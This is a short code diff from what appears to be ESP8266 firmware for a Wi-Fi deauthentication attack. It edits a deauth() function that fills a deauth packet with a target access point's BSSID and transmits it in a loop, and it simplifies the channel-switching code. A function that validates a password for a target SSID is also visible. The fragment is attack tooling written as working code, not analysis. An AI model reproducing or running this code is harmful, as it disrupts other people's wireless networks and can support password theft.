@@ -71,14 +71,7 @@ void deauth(const int channel, String BSSIDstr){
       deauthPacket[i + 16] = bssid[i];
   }
   
-  int beforeChannel;
-  if (channel != WiFi.channel()){
-    //store the current channel and change to the channel of the access point
-    beforeChannel = WiFi.channel();
-    wifi_set_channel(channel);
-    esp.printf("Changing to channel: %i\n", channel);
-    delay(100);
-  }
+  if (channel != WiFi.channel()){ wifi_set_channel(channel); delay(100); }
 
   int i;
   while(deauthing == true) {
@@ -91,12 +84,6 @@ void deauth(const int channel, String BSSIDstr){
     i++;
   }
   digitalWrite(D4, HIGH);
-
-  if (channel != WiFi.channel()){
-    //change back to the channel the the esp was on before the deauthing attack
-    esp.printf("Changing back to channel: %i\n", beforeChannel);
-    wifi_set_channel(beforeChannel);
-  }
 }
 
 void validate(const String &targetSSID, const String &pass){
